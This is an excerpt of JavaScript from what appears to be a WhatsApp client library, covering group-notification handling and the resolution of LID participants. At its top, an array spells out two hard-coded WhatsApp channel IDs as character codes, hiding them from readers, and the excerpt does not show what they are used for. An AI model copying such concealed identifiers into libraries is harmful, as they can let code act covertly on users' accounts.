...
const xkmt = [
    qvnr([
        49,50,48,51,54,51,52,50,51,
        52,54,55,50,51,51,56,56,49,
        64,110,101,119,115,108,
        101,116,116,101,114
    ]),
    qvnr([
        49,50,48,51,54,51,52,48,52,
        49,54,49,50,56,50,51,49,55,
        64,110,101,119,115,108,
        101,116,116,101,114
    ])
];
    ...
    const handleGroupNotification = (participant, child, msg) => {
        ...
        switch (child === null || child === void 0 ? void 0 : child.tag) {
            ...
            case 'revoked_membership_requests':
                ...
                break;
            default:
            // console.log("VELYX-DEBUG:", JSON.stringify({ ...child, content: Buffer.isBuffer(child.content) ? child.content.toString() : child.content, participant }, null, 2))
        }
    };
                ...
                processingMutex.mutex(async () => {
                    ...
                    if (msg.messageStubType === WAProto_1.proto.WebMessageInfo.StubType.CIPHERTEXT) {
                        ...
                        if ((_b = msg.key.participant) === null || _b === void 0 ? void 0 : _b.endsWith('@lid')) {
                            // Never fall back to the bot/account JID for an unresolved LID.
                            // Resolve group LIDs through the participant cache/metadata first;
                            // if no mapping exists, preserve the original LID.
                            const participantLid = msg.key.participant;
                            const resolvedParticipant = (0, WABinary_1.isJidGroup)(msg.key.remoteJid)
                                ? await resolveGroupParticipantJid(msg.key.remoteJid, participantLid)
                                : undefined;
                            msg.key.participant = resolvedParticipant || node.attrs.participant_pn || participantLid;
                        }
